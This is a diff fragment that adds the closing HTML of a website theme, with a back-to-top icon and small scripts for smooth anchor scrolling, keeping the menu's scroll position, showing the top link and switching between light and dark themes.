+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
